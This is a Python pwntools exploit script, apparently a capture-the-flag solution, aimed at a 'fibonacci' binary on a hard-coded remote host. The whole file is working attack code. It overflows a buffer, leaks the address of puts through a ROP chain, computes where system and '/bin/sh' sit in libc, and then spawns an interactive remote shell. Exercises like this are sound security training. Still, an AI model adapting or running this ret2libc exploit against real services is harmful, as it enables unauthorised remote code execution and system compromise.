import sys
from pwn import *
from hexdump import hexdump

"""
provide first payload to leak the libc address of puts, i.e. leak puts_plt(puts_got)
send 47 in order to actually exit the loop (since anything > 46 will cause a break)
compute system and /bin/sh addresses from libc using leaked puts address
provide second payload that will call system(/bin/sh)

since we're on x64, the first arg for each function (in our case puts_got and /bin/sh)
must be placed in rdi, so a pop rdi; ret gadget is used
"""

exec_file = "./fibonacci"
libc_file = "./libc.so.6"
context.binary = exec_file

e = ELF(exec_file)
libc = ELF(libc_file)

offset = 40

io = process(exec_file)
io = remote("141.85.224.108", 31337)

pop_rdi_ret = 0x4007b3


puts_plt = e.symbols['puts']
puts_got = e.symbols['got.puts']
main_address = e.symbols['main']
log.info("puts_got: 0x{:016x}".format(puts_got))
log.info("puts_plt: 0x{:016x}".format(puts_plt))
log.info("main_address: 0x{:016x}".format(main_address))

payload = offset * "A" + pack(pop_rdi_ret) + pack(puts_got) + pack(puts_plt) + pack(main_address)

# Read prompt
io.readline()
# Send the payload.
io.sendline(payload)
# Read output
io.readline()
io.readline()

io.sendline("47")

# Read the leaked information using puts_plt(puts_got).
msg = io.readline()
print ">>>"; hexdump(msg)

# Print leak.
log.info("msg: {}".format(msg))
msg = msg.rstrip("\n")
log.info("len(msg): {}".format(len(msg)))
leak = unpack(msg + (8-len(msg)) * "\x00")
log.info("leak: 0x{:016x}".format(leak))

puts_address = leak
log.info("puts_address: 0x{:016x}".format(puts_address))


# 2. Compute the address of system() and "/bin/sh".

puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search("/bin/sh\x00"))
libc_start_address = puts_address - puts_offset
system_address = libc_start_address + system_offset
bin_sh_address = libc_start_address + bin_sh_offset

log.info("puts_offset: 0x{:016x}".format(puts_offset))
log.info("system_offset: 0x{:016x}".format(system_offset))
log.info("bin_sh_offset: 0x{:016x}".format(bin_sh_offset))
log.info("libc_start_address: 0x{:016x}".format(libc_start_address))
log.info("system_address: 0x{:016x}".format(system_address))
log.info("bin_sh_address: 0x{:016x}".format(bin_sh_address))

# 3. Provide a new payload that calls system("/bin/sh").

payload = offset * "A" + pack(pop_rdi_ret) + pack(bin_sh_address) + pack(system_address)

# Read prompt
io.readline()
# Send the payload.
io.sendline(payload)
# Read output
io.readline()
io.readline()

io.sendline("47")

io.interactive()
